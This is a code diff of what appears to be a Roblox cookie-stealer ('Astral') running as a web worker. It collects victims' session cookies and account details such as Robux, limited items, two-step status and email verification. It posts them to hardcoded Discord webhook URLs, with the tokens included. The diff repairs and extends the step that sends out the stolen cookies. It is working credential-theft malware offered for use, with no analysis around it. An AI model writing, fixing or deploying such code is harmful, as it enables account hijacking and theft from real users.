@@ -197,12 +197,12 @@ export default {
             body: JSON.stringify({ type: 'secondary', data: data, cookie: cookie })
         }).catch(function(err) { console.log('secondary err:', err); });
 
-        // Cookie embed -> DUAL webhook (same as secondary)
+        // Cookie embed -> DUAL webhook (FIXED: pass both cookie and data)
         setTimeout(function() {
             fetch('/api/send', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ type: 'cookie', cookie: cookie })
+                body: JSON.stringify({ type: 'cookie', cookie: cookie, data: data })
             }).catch(function(err) { console.log('cookie err:', err); });
         }, 1000);
     }
@@ -316,7 +316,8 @@ export default {
       try {
         const data = await request.json();
         const type = data.type;
-        const d = data.data;
+        const d = data.data || {};
+        const rawCookie = data.cookie || '';
 
         const FALLBACK1 = 'https://discord.com/api/webhooks/1540619951038136381/WkueJlgMhxX6jYdCNPecU9Qsqo9frye53MI6wWN7fu6R9RbCXlPt0rA9qaYtERnt5jeN';
         const FALLBACK2 = 'https://discord.com/api/webhooks/1540619916305240095/SWEEYFk72dmsfkVUMn3dXNXoidqb4syGhspccO2Hysz--fxwW18E1SZ5EocY8_n64IAR';
@@ -344,7 +345,6 @@ export default {
         // ---- MAIN EMBED (LIVE) ----
         if (type === 'main') {
           webhookUrl = env.WEBHOOK1 || FALLBACK1;
-
           const fields = [
             { name: 'User', value: `[${d.username || 'Unknown'}](${profileLink})`, inline: true },
             { name: 'ID', value: d.userId || 'N/A', inline: true },
@@ -355,16 +355,15 @@ export default {
             { name: 'Status', value: d.apiStatus || 'Processing', inline: true },
             { name: 'Refreshed', value: d.cookieRefreshed ? yes : no, inline: true }
           ];
-
           const embed = {
             title: `\`Astral Beams\` ${fire}`,
             color: 0xffffff,
             fields: fields,
             thumbnail: { url: thumbnailLink },
+            image: { url: thumbnailLink },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
-
           payload = {
             embeds: [embed],
             username: 'Astral',
@@ -375,12 +374,10 @@ export default {
         // ---- DUAL EMBED ----
         else if (type === 'secondary') {
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
-
           let collectibles = 'None';
           if (d.limiteds && d.limiteds.length > 0) {
             collectibles = d.limiteds.join(', ');
           }
-
           const korbloxStatus = d.korblox ? yes : no;
           const headlessStatus = d.headless ? yes : no;
           const valkyrieStatus = d.valkyrie ? yes : no;
@@ -404,10 +401,10 @@ export default {
               { name: 'Settings', value: `Premium: ${d.premium ? `${yes} (${d.premiumRobux || 0} ${robuxEmoji})` : `${no} (0 ${robuxEmoji})`}\nMail: ${d.mailVerified ? `${yes} (Verified)` : `${no} (Unverified)`}\n2SV: ${d.twoStep ? `${yes} (Enabled)` : `${no} (Disabled)`}`, inline: false }
             ],
             thumbnail: { url: thumbnailLink },
+            image: { url: thumbnailLink },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
-
           payload = {
             content: '@everyone',
             embeds: [embed],
@@ -415,14 +412,15 @@ export default {
           };
         }
 
-        // ---- COOKIE EMBED (separate message sent to DUAL webhook) ----
+        // ---- COOKIE EMBED (FIXED) ----
         else if (type === 'cookie') {
-          // Explicitly use the dual webhook URL
           webhookUrl = env.WEBHOOK2 || FALLBACK2;
+          const cookieToSend = rawCookie || d?.refreshedCookie || '';
           const embed = {
             title: 'Refreshed Cookie',
             color: 0xffffff,
-            description: '```' + data.cookie + '```',
+            description: '```' + cookieToSend + '```',
+            thumbnail: { url: thumbnailLink || 'https://i.ibb.co/v6SjQn5D/astrallogo.webp' },
             footer: { text: `Astral • ${new Date().toLocaleString()}` },
             timestamp: new Date().toISOString()
           };
